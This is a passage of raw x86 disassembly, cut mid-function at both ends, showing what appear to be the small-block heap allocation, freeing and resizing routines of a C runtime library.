  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
